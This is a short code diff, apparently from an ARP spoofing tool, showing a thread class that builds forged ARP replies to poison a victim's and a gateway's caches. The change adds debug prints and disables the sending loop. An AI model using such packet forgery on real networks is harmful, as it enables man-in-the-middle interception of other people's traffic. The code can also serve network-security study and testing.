@@ -48,8 +48,10 @@ class attackThread(threading.Thread):
 
 		victim_arp = epacket1 + self.protocol + self.mac + gip + victim_mac + vip
 		gateway_arp = epacket2 + self.protocol + self.mac + vip + gateway_mac + gip
+		print(victim_arp)
+		print(victim_arp.decode())
 
-		while True:
+		while 0:
 			self.connect.send(victim_arp)
 			print(" Packet send to " + self.victim)
 			self.connect.send(gateway_arp)
